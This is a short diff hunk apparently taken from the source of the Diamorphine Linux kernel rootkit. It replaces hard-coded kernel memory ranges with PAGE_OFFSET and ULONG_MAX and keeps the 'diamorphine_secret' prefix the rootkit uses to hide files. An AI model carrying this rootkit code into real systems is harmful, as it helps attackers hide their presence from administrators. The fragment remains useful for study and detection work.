@@ -5,13 +5,8 @@ struct linux_dirent {
         char            d_name[1];
 };
 
-#ifdef __x86_64__
-        #define START_MEM 0xffffffff81000000
-        #define END_MEM 0xffffffff81fffffff //0xffffffffa2000000
-#else
-        #define START_MEM 0xc0000000
-        #define END_MEM 0xd0000000
-#endif
+#define START_MEM	PAGE_OFFSET
+#define END_MEM		ULONG_MAX
 
 #define MAGIC_PREFIX "diamorphine_secret"
 
